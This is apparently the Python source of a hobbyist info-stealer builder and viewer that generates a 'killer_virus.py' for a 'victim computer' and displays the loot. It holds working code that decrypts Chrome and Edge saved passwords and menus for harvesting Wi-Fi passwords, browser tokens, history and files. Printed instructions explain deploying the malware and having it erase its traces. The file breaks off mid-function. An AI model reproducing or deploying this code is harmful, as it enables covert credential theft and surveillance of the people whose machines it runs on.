import socket
import os
import time 
import json
import random
import shutil
import tkinter as tk 
import win32crypt
import base64;
import webbrowser
from termcolor import colored
from datetime import datetime,timedelta
from Crypto.Cipher import AES

#path =====>path_list <========================
root_path='C:\\Users\\Public\\akki'
main_path=root_path+'\\The_stealer'
dev_resorse=main_path+'\\dev_path'
# ['info_mv.json','row_virus.txt']
info_resorse=main_path+'\\info_path'
list_dir=os.listdir(info_resorse)
#info_resorse==>name==>database(info.json),collected_data

# conficuration of code
def display_text(text):
    root = tk.Tk()
    root.configure(background='#0a0a0a')
    root.geometry("1200x400") 
    frame = tk.Frame(root, bg='#0a0a0a')
    frame.pack(fill='both', expand=True)
    text_widget = tk.Text(frame, wrap='word', bg='#0a0a0a', fg='white', font=('8514oem', 8))
    text_widget.insert('1.0', text)
    text_widget.pack(side='left', fill='both', expand=True)
    v_scrollbar = tk.Scrollbar(frame, orient='vertical', command=text_widget.yview)
    v_scrollbar.pack(side='right', fill='y')
    text_widget.configure(yscrollcommand=v_scrollbar.set)
    h_scrollbar = tk.Scrollbar(root, orient='horizontal', command=text_widget.xview)
    h_scrollbar.pack(side='bottom', fill='x')
    text_widget.configure(xscrollcommand=h_scrollbar.set)
    root.mainloop()
def chrome_data_and_time(chrome_date):
    try:return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)
    except Exception:return None
def password_decryption(password: bytes, key):
    try:
        encryption_key =base64.b64decode(key)[5:]
        encryption_key=win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]#encryption key
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(password)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            try:return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except Exception:return "No Passwords"
    except Exception:return 'Error'
def system_info_basic_configuration(row_data):
    modified_data=''
    list1=['system','architecture','mashine','network_name','platform','prosessor','python_comp','python_version','revision_py','addisional_info','host_name','ip_address','network_interface','profile','password']
    modified_data+='_'*36+'system information'+'_'*36+'\n\n'
    modified_data+="".join("{:<{}}|{:>{}}\n".format(str(list1[num]),45,str(row_data[num]),45) for num in range(12))
    modified_data+='_'*38+'wifi passwords'+'_'*38+'\n\n'
    modified_data+="".join("{:<{}}|{:>{}}\n".format(str(row_data[13][num]),45,str(row_data[14][num][0]),45) for num in range(len(row_data[14])))
    return modified_data
def chrome_basic_data_configuration(row_data):
    modified_data=''
    list1=['gaia_given_name','gaia_id','gaia_name','hosted','last_downloads_gaia','managed_user_id','name','user_id','  ']
    list2=['birthday','cash_guid_related_to_bday','birth_year','gender','accept_language','selected_language','last_gaia_id','REFRESH_TOKEN_RECEIVED_TIME','REFRESH_TOKEN_RECEIVED_VALUE']
    encryption_key=row_data.pop(0);profile_list=row_data.pop(0)
    for number,data in enumerate( row_data,start=0):
        preferanse_data=data.pop(-1)
        modified_data+="\n"+str(profile_list[number]).center(90,'=')+'\n'+"="*90+'\n\n'
        modified_data+=''.join("{:<{}}|{:>{}}".format(str(list1[num]),45,str(info),45)+"\n" for num,info in enumerate(data,start=0))
        modified_data+="\n"+"_"*37+" preferance data"+"_"*37+"\n"
        if not len(preferanse_data)<=2:modified_data+="".join("{: <{}}|{:>{}}".format(str(list2[num]),45,str(i),45)+"\n" for num,i in enumerate(preferanse_data,start=0))
        else:modified_data+="".join(str(l)+'\n' for l in preferanse_data)
    modified_data+='\n\nencryption key : '+str(encryption_key)
    return modified_data
def chrome_id_and_password_configuraation(row_data):
    modified_data=''
    list1=['main_url','login_page_url','user_name','password','creation_date','last_used_date']
    if row_data[0]=='default01':
        row_data_part=row_data[3]
        encryption_key=row_data_part[1]
        print(encryption_key)
        for round,value in enumerate(row_data[1],start=0):
            modified_data+='\n\n\n'+'_'*42+'data'+str(round)+'_'*42+'\n\n'
            modified_data+="\n"+"="*90+"\n"
            modified_data+="\n{:<{}}|{:>{}}".format(list1[0],45,str(value[0]),45)
            modified_data+="\n{:<{}}|{:>{}}".format(list1[1],45,str(value[1]),45)
            modified_data+="\n{:<{}}|{:>{}}".format(list1[2],45,str(value[2]),45)
            modified_data+="\n{:<{}}|{:>{}}".format(list1[3],45,str(password_decryption(value[3],encryption_key)),45)
            modified_data+="\n{:<{}}|{:>{}}".format(list1[4],45,str(chrome_data_and_time(value[4])),45)
            modified_data+="\n{:<{}}|{:>{}}".format(list1[5],45,str(chrome_data_and_time(value[5])),45)
    elif row_data[0] in ('error202:)','error404:)'):modified_data+='\n\n\n_'*43+'data'+"data"+'_'*43+'\n\n'+str(row_data[1][0][0]).center(90,'_')
    else:modified_data+='there-is-some-error-or-data-is-not-readable'.center(90,'-')
    row_data_part=row_data[3]
    profile_list=row_data_part.pop(0);encryption_key=row_data_part.pop(0)
    for num,data in enumerate(row_data_part,start=0):
        modified_data+="\n\n\n"+profile_list[num].center(90)
        if data.pop(0):
            for items in data:
                modified_data+="\n"+"="*90+"\n"
                modified_data+="\n{:<{}}|{:>{}}".format(list1[0],45,str(items[0]),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[1],45,str(items[1]),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[2],45,str(items[2]),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[3],45,str(password_decryption(items[3][0],encryption_key)),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[4],45,str(chrome_data_and_time(items[3][1])),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[5],45,str(chrome_data_and_time(items[3][2])),45)
        else:modified_data+="\n"+"="*90+"\n"+str(items[0])
    return modified_data
def chrome_web_data_configuration(row_data):
    modified_data=''
    list1=['name','value','date_created','date_last_used','']
    defalt_autofil=row_data[0];defalt_toke=row_data[1];profile_autofil=row_data[2];proile_token=row_data[3]
    if defalt_autofil[0]:
        for num,data in enumerate(defalt_autofil[1],start=0):modified_data+="\n"+"="*90+''.join("\n{: <{}}|{:>{}}".format(list1[num],45,str(data[num]),45))+'\n'
    else:modified_data+='\n'+'='*90+'\n'+str(defalt_autofil[1][0])+'\n'
    if defalt_toke[0]:modified_data+=''.join("\n"+"="*90+"\n{:<{}}|{:>{}}".format(data[0],45,data[1],45)for data in defalt_toke[1])
    else:modified_data+='\n'+'='*90+'\n'+str(defalt_toke[1][0])
    profile_list=profile_autofil.pop(0)
    for num,data in enumerate(profile_autofil,start=0):
        modified_data+="\n\n"+str(profile_list[num]).center(90,'=')
        if data.pop(0):
            for query in data:modified_data+="\n"+"="*90+"\n"+''.join("\n{:<{}}|{:>{}}".format(list1[count],45,str(value),45)for count,value in enumerate(query,start=0))+'\n'
        else:modified_data+='\n'+'='*90+'\n'+str(data[1][0])
    for num,data in enumerate(proile_token,start=0):
        modified_data+="\n\n"+str(profile_list[num]).center(90,'=')
        if data.pop(0):modified_data+=''.join("\n"+"="*90+"\n{:<{}}|{:>{}}".format(str(value[0]),45,str(value[1]),45)for value in data)
        else:modified_data+="\n"+"="*90+"\n"+str(data[1][0])
    return modified_data
def chrome_history_data_configuration(row_data):
    modified_data=''
    list1=['Url','Title','Visit_count']
    if row_data[0]:
        keyword=row_data[1];visisted_site=row_data[2]
        if keyword[0]:modified_data+='\n'+'keyword value'.center(90,'=')+'\n'+''.join(f'{num}. {data}\n' for num,data in enumerate(keyword[1],start=0))
        else:modified_data+='\n'+'- unable to fatch data of keyword default -'.center(90,'!')
        if visisted_site[0]:
            modified_data+='\n'+' visisted site '.center(90,'=')+'\n'
            for data in visisted_site[1]:modified_data+='='*90+''.join('\n{: <{}}|{:>{}}'.format(list1[num],20,str(value),70) for num,value in enumerate(data,start=0))+'\n'
        else:modified_data+'\n'+'- unable to fatch data of visited site default '.center(90,'!')+'\n'
    else:modified_data+='\n'+'path of default history data not exist'.center(90,'!')+'\n'
    profile_list=row_data[3];child_root=row_data[4]
    if bool(profile_list):
        for num,items in enumerate(child_root[0],start=0):
            modified_data+='\n\n'+'='*90+'\n'+profile_list[num].center(90,'=')+'\n'+'='*90+'\n'
            if items[0]:
                keyword=items[1];visisted_site=items[2]
                if keyword[0]:modified_data+='\n'+str(profile_list[num]).center(90,'=')+'\n'+''.join('\n'+str(i) for i in keyword[1])
                else:modified_data+='\n'+'unable to fatch data of keyword'.center(90,'=')+'\n'
                if visisted_site[0]:modified_data+='\n'+'visisted site'.center(90,'=')+'\n'+''.join('\n'+'='*90+''.join("\n{:<{}}|{:>{}}".format(list1[num],20,str(i),70)for num,i in enumerate(data))for data in visisted_site[1])#:) i just wanna maintain the structure so i wrote that big line of code in 1 :)
                else:modified_data+='\n'+'unable to fatch data of visited site'.center(90,'!')+'\n'
            else:modified_data+='\n'+'path of history data not exist'.center(90,'!')+'\n'
    else:modified_data+='first_test_failed(no list of profile ound)'+'\n2nd step faild (no data in profils)'if not bool(child_root) else +"\n"+"2nd step passed (data in profils)\ncurrently no way to extraact data like that\nif u devloper u can extract it by coding skill or by\ninding the exact order of proile are diserbuted all the best"
    return modified_data
def edge_data_configuration(row_data):
    modified_data=''
    list1=['edge acc cid','first name','last name','gaia id','gaia name','user name','encryption_key','']
    encryption_key=row_data[0][6];child_data=row_data[1]
    modified_data+='\n'+'edge_data'.center(90,'=')+''.join('\n{:<{}}|{:>{}}'.format(list1[num],20,str(value),70)if not num==6 else '\n'+'='*90+'\n\n' for num,value in enumerate(row_data[0],start=0))
    if child_data.pop(0):
        for i in child_data:
            modified_data+='\n'+'edge_id password'.center(90,'=')
            modified_data+='\n{: <{}}|{:>{}}'.format('origin url',20,str(i[0]),70)
            modified_data+='\n{: <{}}|{:>{}}'.format(' username_elements',20,str(i[1]),70)
            modified_data+='\n{: <{}}|{:>{}}'.format('password_value',20,str(password_decryption(i[2],encryption_key)),70)
            modified_data+='\n{: <{}}|{:>{}}'.format('date_created',20,str(chrome_data_and_time(i[3])),70)
            modified_data+='\n{: <{}}|{:>{}}'.format('date_last_used',20,str(chrome_data_and_time(i[4])),70)
    else:modified_data+='\n'+'edge_id password'.center(90,'=')+'\n'+str(child_data[0])
    return modified_data  
def opening_data(name='',data=''):
    if name in ('chr_history_datanew','chr_history_data'):data_get=chrome_history_data_configuration(data)
    elif name in ('chrome_data','chrome_datanew'):data_get=chrome_basic_data_configuration(data)
    elif name in ('chrome_id_passnew','chrome_id_pass'):data_get=chrome_id_and_password_configuraation(data)
    elif name in ('chrome_web_datanew','chrome_web_data'):data_get=chrome_web_data_configuration(data)
    elif name in ('system_edgenew','system_edge'):data_get=edge_data_configuration(data)
    elif name in ('system_infonew','system_info'):data_get=system_info_basic_configuration(data)
    else:data_get=None
    return data_get
def show_json_info(path):
    with open(path,'r',encoding='Utf-8')as lol1:data=json.load(lol1)
    def data_get(name):
        try:
            info=data["expected_return"][name]
        except Exception: info=None
        return str(info)
    def data_get1(name):
        try:
            info=data["we_got_in_return"][name]
        except KeyError: info=data["data_able_to_collect"][name]
        except Exception:info=None
        return str(info)
    try:name_of_v=data['name_of_virus']
    except Exception:name_of_v=data["name_of_attack"]
    print(colored('-'*40+'info of attack'+'-'*40,'yellow'))
    print(colored('Name of Virus :- ','blue')+colored(name_of_v,'white',attrs=['bold']))
    print(colored('Encryption Key :- ','blue')+colored(data['encryption_key'],'cyan')+'\n')
    print(colored('Information Given:------------','blue'))
    try:print(colored('   - Created Date: ','blue')+colored(data['created_date']))
    except Exception:pass
    try:print(colored('   - Last Time Opened: ','blue')+colored(data['last_time_open']))
    except Exception:pass
    try:print(colored('   - Received Status: ','blue')+colored(data['ressived_status']))
    except Exception:pass
    try:print(colored('   - Data Received Time: ','blue')+colored(data['data_resived_time']))
    except Exception:print(colored('   - Data Received Time: ','blue')+colored(data['status']))
    print(colored('='*65,'black')+'\n'+'|{:^{}}|{:^{}}|{:^{}}|'.format(colored('Value','light_yellow'),29,colored('Expected return','yellow'),30,colored('We got in return','yellow'),30)+'\n'+colored('-'*66,'black'))
    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('system_info','light_yellow'),29,colored(data_get("system_info"),'blue'),30,colored(data_get1("system_info"),'blue'),30)+'\n'+colored('-'*66,'black'))
    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('chrome_basic_data','light_yellow'),29,colored(data_get("chrome_basic_data"),'blue'),30,colored(data_get1("chrome_basic_data"),'blue'),30)+'\n'+colored('-'*66,'black'))
    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('chrome_id-pass','light_yellow'),29,colored(data_get("chrome_id-pass"),'blue'),30,colored(data_get1("chrome_id-pass"),'blue'),30)+'\n'+colored('-'*66,'black'))
    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('chrome_web_data','light_yellow'),29,colored(data_get("chrome_web_data"),'blue'),30,colored(data_get1("chrome_web_data"),'blue'),30)+'\n'+colored('-'*66,'black'))
    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('chrome_history_data','light_yellow'),29,colored(data_get("chrome_history_data"),'blue'),30,colored(data_get1("chrome_history_data"),'blue'),30)+'\n'+colored('-'*66,'black'))
    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('edge_data','light_yellow'),29,colored(data_get("edge_data"),'blue'),30,colored(data_get1("edge_data"),'blue'),30)+'\n'+colored('-'*66,'black'))
    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('dir_search','light_yellow'),29,colored(data_get("dir_search"),'blue'),30,colored(data_get1("dir_search"),'blue'),30)+'\n'+colored('-'*66,'black'))
    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('encryption_data','light_yellow'),29,colored(data_get("encryption_data"),'blue'),30,colored(data_get1("encryption_data"),'blue'),30)+'\n'+colored('-'*66,'black'))
#related to devlopment 
def show_files(list_dir,path):
    while True:
        skull_img(True)
        print(colored('-'*28+' All_Extracted_Fills '+'-'*28,'yellow'))
        print(colored("{:<{}}-    {:<{}}-  {} -   {}".format("num",6,'File names',40,'encryption','file type',)+'\n'+'-'*78,'light_yellow'))
        for num,value in enumerate(list_dir,start=0):
            encryption_staus='True' if value.endswith('new') else 'False'
            type_file ='Dir' if os.path.isdir(path+'\\'+value) else ('TXT' if value.endswith('.txt') else ('Python' if value.endswith('.py') else ('xlsx' if value.endswith('.xlsx') else ('docx' if value.endswith('.docx') else ('pptx' if value.endswith('.pptx') else ('xls' if value.endswith('.xls') else ('doc' if value.endswith('.doc') else ('rtf' if value.endswith('.rtf') else ('msg' if value.endswith('.msg') else ('eml' if value.endswith('.eml') else ('csv' if value.endswith('.csv') else ('xml' if value.endswith('.xml') else ('html' if value.endswith('.html') else ('mht' if value.endswith('.mht') else ('odt' if value.endswith('.odt') else ('ods' if value.endswith('.ods') else ('odp' if value.endswith('.odp') else ('odf' if value.endswith('.odf') else ('dotx' if value.endswith('.dotx') else ('dotm' if value.endswith('.dotm') else ('dot' if value.endswith('.dot') else 'File')))))))))))))))))))))
            print("{:<{}}-    {:<{}}-   {:<{}}-   {}".format(colored(f"[{num}]",'light_yellow'),15,colored(str(value),'magenta'),49,colored(str(encryption_staus),'blue'),19,colored(str(type_file),'red')))
        response= input(colored('([n]for going back)enter your response here:  ','red'))
        if response.isdigit() and int(response)>-1 and int(response)<len(list_dir):
            if list_dir[int(response)]=='dir_search':nothing=input(colored('dir search file encrypted u can directally open them in this path-> '+path,'yellow'));continue
            elif str(list_dir[int(response)]).endswith('new'):nothing=input(colored('file encrypted first decrypt them','red'));continue
            else: return int(response)
        elif response=='n':return None
        else:nothing=input(colored('you typed something wrong type digit only and within the range','light_red'))
def number_decoding(number:str,key:str):
    k=key.split('0');k.pop(k.index(''))
    w='abcdefghijklmnopqrstuvwxyz!@#$%^&*()_-+={}[]|\\:;\"\'<,>.?/~` 1234567890'
    c={w[i]:k[i]for i in range(69)}
    c2=k[69:81]
    str1=[i if not i in c2 else '53' for i in number.split('0')]
    decoded_str=''.join(next(key for key,value in c.items()if value==i) if i in c.values() else i for i in str1)
    return decoded_str
def number_coding(string:str, key:str):
    k=key.split('0');k.pop(k.index(''))
    w = 'abcdefghijklmnopqrstuvwxyz!@#$%^&*()_-+={}[]|\\:;\"\'<,>.?/~` 1234567890'
    c = {w[i]: k[i] for i in range(69)}
    c2 = k[69:81]
    encoded_str = ''.join(c[i]+'0' if i in c else i+'0' for i in string)
    str1 = ''.join
def creating_random_key():
    numb_list = [ '11', '12', '13', '14', '15', '16', '17', '18', '19', '21', '22', '23', '24', '25', '26', '27', '28', '29', '31', '32', '33', '34', '35', '36', '37', '38', '39', '41', '42', '43', '44', '45', '46', '47', '48', '49', '51', '52', '53', '54', '55', '56', '57', '58', '59', '61', '62', '63', '64', '65', '66', '67', '68', '69', '71', '72', '73', '74', '75', '76', '77', '78', '79', '81', '82', '83', '84', '85', '86', '87', '88', '89', '91', '92', '93', '94', '95', '96', '97', '98', '99']
    random.shuffle(numb_list)
    key=''.join(n+'0' for n in numb_list)
    return key
def format_printing(header:str='None',main:str='None',footer:str='None',header_color:str='white',main_color:str='white',footer_color:str='white',seprater:str=',',main_indent:int=25,header_footer_indent:int=17):
    """
    Function to print formatted text with options for header, main text, footer,
    colors, indentation, and separator.

    Arguments:
    header (str): Header text separated by the specified separator.
    main (str): Main text separated by the specified separator.
    footer (str): Footer text separated by the specified separator.
    header_color (str): Color for the header text.
    main_color (str): Color for the main text.
    footer_color (str): Color for the footer text.
    main_indent (int): Indentation for the main text.
    header_footer_indent (int): Indentation for the header and footer text.
    separator (str): Separator used to split the input text.
    """
    if not header=='None':
        header=header.split(seprater)
        for i in header:print(colored(' '*header_footer_indent+i,header_color,attrs=['bold']))
    if not main=='None':
        main=main.split(seprater)
        for i in main:print(colored(' '*main_indent+i,main_color))
    if not footer=='None':
        footer=footer.split(seprater)
        for i in footer:print(colored(' '*header_footer_indent+i,footer_color))
def creeating_path(info_mv_path,info_resorse_path:str):
    '''this will create path and return the name of path if path already exist then return None
    ask for attack name t create path and target name takes 2 argument 
    1. info_mv_path --> mv_path where it's save names
    2. info_resorse_path --> the path where dir have to be made '''
    skull_img(True)
    with open(info_mv_path,'r')as file:
        info_collected=json.load(file);file.close()
        attack_name_list=info_collected['name_of_attacks']
    list_dir=os.listdir(info_resorse)
    name_of_attack=input(' '*17+colored('what you wanna give it a name of attack? ','yellow'))
    per_name=input(' '*17+colored('enter the target name :  ','yellow'))
    if name_of_attack+'dir' in list_dir:
        print(' '*17+colored('name_already_exist','red'))
        nothing=input(' '*17+colored('tap anything to continue','red'))
        return None
    elif not name_of_attack in list_dir:
        os.mkdir(info_resorse_path+'\\'+name_of_attack+'dir')
        os.mkdir(info_resorse_path+'\\'+name_of_attack+'dir'+'\\database')
        os.mkdir(info_resorse_path+'\\'+name_of_attack+'dir'+'\\collected_data')
        attack_name_list[name_of_attack]=per_name
        print(' '*17+colored('direrctory created with name','light_blue')+colored(name_of_attack,'blue'))
        nothing=input(' '*17+colored('tap anything to continue','yellow'))
        with open(info_mv_path,'w')as file:
            info_collected['name_of_attacks']=attack_name_list
            json.dump(info_collected,file);file.close()
        print(' '*16+colored('first step compleated','blue'))
        return name_of_attack
    else:
        nothing=input(' '*17+colored('unexpected-error- type the name_of_attack_again_','red'))
        return None
def skull_img(clear=False,level_2=False):
    '''it's logo of this software take areguments 
    clear this argument clear all the previous text and after that print skull
    level2 this is a text of create virus secoend level'''
    os.system('cls')if clear else None
    print(colored('                             _,.-------.,_','red',attrs=['bold']))
    print(colored('                           ,-~             ~-.','red',attrs=['bold']))
    print(colored('                        ,^___             ___^.','red',attrs=['bold']))
    print(colored('                        /~"   ~"   .   "~   "~\\','red',attrs=['bold']))
    print(colored('                      Y  ,---._    I    _.---.  Y','red',attrs=['bold']))
    print(colored('                      | Y      ~-. | ,-~      Y | ','red',attrs=['bold']))
    print(colored('                      | |         }:{         | |','red',attrs=['bold']))
    print(colored('                      | |         }:{         | |','red',attrs=['bold']))
    print(colored('                      j l        / | \        ! l','red',attrs=['bold']))
    print(colored('                   .-~  (___,.--" .^. "--.,___)  ~-.','red',attrs=['bold']))
    print(colored('                  (            / / | \ \            )','red',attrs=['bold']))
    print(colored('                   \._____,   ~  \/"\/  ~   ._____,/','red',attrs=['bold']))
    print(colored('                    ^.____                   ____.^','red',attrs=['bold']))
    print(colored('                       | |T ~\   !   !   /~ T| |','red',attrs=['bold']))
    print(colored('                       | |l    _ _ _ _ _    !| |','red',attrs=['bold']))
    print(colored('                       | l \ /V V V V V V\ / j |','red',attrs=['bold']))
    print(colored('                       l  \ \ |_|_|_|_|_|/  /  !','red',attrs=['bold']))
    print(colored('                        \  \ [T T T T T TI /  /','red',attrs=['bold']))
    print(colored("                         \   `^-^-^-^-^-^'   /",'red',attrs=['bold']))
    print(colored('                          \                 / ','red',attrs=['bold']))
    print(colored('                           \.             ,/','red',attrs=['bold']))
    print(colored('                            "^-. ______,-^"\n\n','red',attrs=['bold']))
    if level_2:
        print(colored(' '*14+'step two begin__ customaizing the stealer.py fille_'.center(54),color='blue'))
def check_internet_connection():
    '''check internet conection and return True if internet is conected else False'''
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect(("www.google.com", 80))
        return True
    except socket.error:
        return False
    finally:
        sock.close()
def response1(creating:bool=True):#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!![help]
    '''it's ask if the virus has to be made offline or online return True and False'''
    if creating:
        header='what kind of virus you wawnna make?'
        main='[1]offline,[2]online,[3]help,[4]exit'
        explaind='explained '
    else:
        header='from where u wanna collect the data?'
        main='[1]offline,[2]online,[3]help,[4]exit'
        explaind='explained'
    while True:
        skull_img(clear=True)
        format_printing(header=header,header_color='yellow',main=main,main_color='blue',main_indent=30)
        if (respnse:=input(colored(' '*19+'your response here 1/2/3  ',color='light_red')))=='1':return False
        elif respnse=='2':
            print(''*15+colored('making internet virus not available yet','red'));time.sleep(1)
            continue
            # if check_internet_connection():print(colored(' '*19+'internet is conected','blue'));return True
            # else:print(colored(' '*17+'internt is not conected wanna try again',color='red'))
        elif respnse=='3':print(colored(explaind,'green'))
        elif respnse=='4':return 'n'
        else:print(colored(' '*19+'type only given in the oprtions',color='black'))
        nothing=input()
def creating_virus(type_of_virus:bool,path_of_rowvirus:str,target_path:str,name_of_virus:str,path_of_json:str):
    '''it's create the virus and return noting it's take 3 argument:-
    1. type of virus:      define virus shoude be offline or online
    2. path of row virus:  ask for the path where row virus has been writen
    3. target path :       where virus has to be save after creating'''
    while True:
        true_false=['C:\\Users\\Public',False,False,False,False,False,False,False,False,False,'hello_world',False,[False,False,'',False,[],False,[]],'','']
        # true_false=['C:\\Users\\Public',True,True,True,True,True,True,True,True,True,'',True,False]
        skull_img(clear=True,level_2=True)
        nothing=input()
        print(colored('do you wanna change the storing directory in victim computer (default value C:\\Users\\Public) ','yellow'))
        if input(colored('WARNING/!\\ : if the dir path is wrong code wont run and coude couse error: y/n  ',color='red')).lower()=='y':
            true_false[0]=input(' '*17+colored('enter the dir: ','blue'))
        else:pass
        skull_img(clear=True,level_2=True)
        if input(' '*15+colored('do you wanna collect system info ex- ip  y/n ','yellow')).lower()=='y':true_false[1]=True
        else:true_false[1]=False
        skull_img(clear=True,level_2=True)
        if input(' '*15+colored('do you wanna collect chrome data  y/n ','yellow')).lower()=='y':true_false[2]=True
        else:true_false[2]=False
        if true_false[2]:
            if input(' '*15+colored('do you wanna collect chrome basic info  y/n ','blue')).lower()=='y':true_false[3]=True
            else:true_false[3]=False
            if input(' '*15+colored('do you wanna collect chrome id passwords  y/n ','blue')).lower()=='y':true_false[4]=True
            else:true_false[4]=False
            if input(' '*15+colored('do you wanna colect chrome web data (tell about person interst)  y/n ','blue')).lower()=='y':true_false[5]=True
            else:true_false[5]=False
            if input(' '*15+colored('do you wanna collect chrome history data  y/n','blue')).lower()=='y':true_false[6]=True
            else:true_false[6]=False
        else:true_false[3]=False;true_false[4]=False;true_false[5]=False;true_false[6]=False
        skull_img(clear=True,level_2=True)
        if input(' '*15+colored('do you wanna collect edge data(edge_bais info,edge default id password) y/n ','yellow')).lower()=='y':true_false[7]=True
        else:true_false[7]=False
        #!!!!!!!!!!!!!!!!!!!!!!!!!!!enditing!!!!!!!!!!!!!!!!!!!
        skull_img(clear=True,level_2=True)
        if input(' '*15+colored('do you wanna dir search?(collect files) ','yellow')+colored(" /!\\takes 1-5min ",'red')+colored("_y/n ",'yellow')).lower().strip()=='y':
            true_false[12][0]=True
            if input(colored('do u wanna add specific path to scan(if no then default woude be whole computer) ? y/n','blue')).strip().lower()=='y':
                true_false[12][1]=True;true_false[12][2]=input(colored("Add your path here(defult=>C:\\Users\\) /!\\path shoude be cuurect, use only one'\\'",'light_blue'))
            else:true_false[12][1]=False;true_false[12][2]=' '
            if input(' '*15+colored("do u wanna search obj with obj name? y/n","blue"))=='y':
                true_false[12][3]=True;true_false[12][4]=input(colored("enter list of names seprated by ',': ",'red')).split(',')
            else:true_false[12][3]=False;true_false[12][4]=[]
            if input(' '*15+colored('do u wanna search fils by there extenstion? y/n','blue'))=='y':
                true_false[12][5]=True;true_false[12][6]=input(colored("enter list of names seprated by ',': ",'red')).split(',')
            else:true_false[12][5]=False;true_false[12][6]=[]
        else:true_false[12]=[False,False,'',False,[],False,[]]
        # !!!!!!!!!!!!!!!!!!!!!!!!!!under here only!!!!!!!!!!!!!!!!!
        skull_img(clear=True,level_2=True)
        if input(colored('do you wanna encrypt all data you collectd (!its incresse the size of file 2.5x).recomanded  y/n ','yellow')).lower()=='y':true_false[8]=True
        else:true_false[8]=False
        skull_img(clear=True,level_2=True)
        if input(' '*17+colored(' you wanna leave any meassage? y/n ','yellow')).lower()=='y':true_false[9]=True;true_false[10]=input(' '*17+colored('message you wanna show ? ',color='blue'))
        else:true_false[9]=False
        if type_of_virus:true_false[11]=True
        else:true_false[11]=False
        true_false[13]=creating_random_key()
        true_false[14]=name_of_virus
        info_obj={
            'name_of_virus':name_of_virus,
            'encryption_key':true_false[13],
            'info_given':true_false,
            'expected_return':{
                'system_info':true_false[1],
                'chrome_basic_data':true_false[2],
                'chrome_id-pass':true_false[4],
                'chrome_web_data':true_false[5],
                'chrome_history_data':true_false[6],
                'edge_data':true_false[7],
                'dir_search':[true_false[12][0],len(true_false[12][4]),len(true_false[12][6])],
                'encryption_data':true_false[8]
            },
            'created_date':str(datetime.now()),
            'last_time_open':str(datetime.now()),
            'ressived_status':False,
            'we_got_in_return':' ',
            'data_resived_time':''
            }
        if input(colored('if there is any option you selected wrong you can file form again do you wanna fill form again?  y/n','red')).lower()=='y':pass
        else:break
    with open(path_of_json,'w+',encoding='utf-8') as info_fp:
        json.dump(info_obj,info_fp)
    with open(path_of_rowvirus,'r+')as vr:
        virus_row=vr.read()
        xx=virus_row.index('true_false')
        created_virus=virus_row[0:+xx+11]+str(true_false)+virus_row[xx+15:]
    with open(target_path+'\\database\\killer_virus.py','x') as kipy:kipy.write(created_virus);kipy.close()
    skull_img(True)
    print(colored('virus has been created in this directory:-','yellow'),colored(target_path+'\\database\\killer_virus.py','blue'))
    print(colored('\nat first copy both bat and py fille in same directory in victim computer\nthen run bat fille first and leave the rest work on the code :)','light_blue'))
    if type_of_virus:
        print(colored('virus will send the all file in the given mail address just','blue'),colored('collect it before 24hours from ur computer','red'))
    else:
        print(colored('wait few minutes and after that copy the filles from victim devies by given path or default path("C:\\Users\\Public") and put it in your devies and you done... ','blue'))
        print(colored('and after 2 min code will remove its self all the trase and after that','blue'),colored('run main.py in your computer and go to [3]collecting data and show the directory where u put app data','yellow'))
    nothing=input(colored('tap anything to continue','light_yellow'))
def about_me():
    while True:
        os.system('cls')
        main_content=",hey akki here i am 18 year old guy just turnd 18 this year 1st jan i am glab that you reading about me ammm.....,so i wrote this code becouse i was watching mr robort and i thoght i coude make something too i know it's not that good but i made it, ,so i am just an normal boy who have a lot of goals and dream like opening my own company but main goal is to get,job in google yes that's my dying wish to achive and amm i have a lot of hobbies hee like chess  archary  reading books,coding and yes python is my first love and yes i am single and yes i am hopeing to find gf from here haahahahhahahah,ammmm there is more i like i know mobile reparing i did job to for 2 year after learing i am so good at that and ,it's best job tbh all u have to do is seat and just yes start reparning which takes time but fun hee hee and that's it ,i only have 1friend so yes i am hoping to find friend from here tooo and i like skeching i woude love to show u my, sketch trust me that's so good also my goal is to go new yurk also this year just for 2 months i did job as an it ,teacher in n institute where i was studying becouse they like me tho but i was not able to maintain coding study ,and me time with job so i left hee hee lol what can i say more idk i don't even understand my self preety well becouse, of Derealization Disorder amm..yes i want to learn languages currently learning spanish,"
        format_printing(header='About Akki [akhand raj ]',main=main_content,footer='my socsial media ----->,[1]instagam - personal -> @akk_raj_._,[2]instagram - public -> @its_just_me_akki,[3]git_hub --> Akkiraj1234,[4]"exit"',main_indent=0,main_color='cyan',footer_color='blue',header_color='yellow',header_footer_indent=0)
        response=input(colored('ENTER YOUR RESPONSE HERE:--->   ','light_yellow'))
        if response.lower()=='1':print(colored('link opening--> instagram-> @akki_raj_._ ','magenta'));time.sleep(1);webbrowser.open("https://www.instagram.com/akki_raj_._/")
        elif response.lower()=='2':print(colored('link opening--> instagram-> @its_just_me_akki','magenta'));time.sleep(1);webbrowser.open("https://www.instagram.com/its_just_me_akki/")
        elif response.lower()=='3':print(colored('link opening--> github-> Akkiraj1234 ','magenta'));time.sleep(1);webbrowser.open("https://github.com/Akkiraj1234")
        elif response.lower()=='4':break
        else:input(colored('you typed something wrong','red'))
def collecting_data(info_resorse):
    skull_img(True)
    print(' '*16+colored('you colecting the data offline show the','yellow'))
    while True:
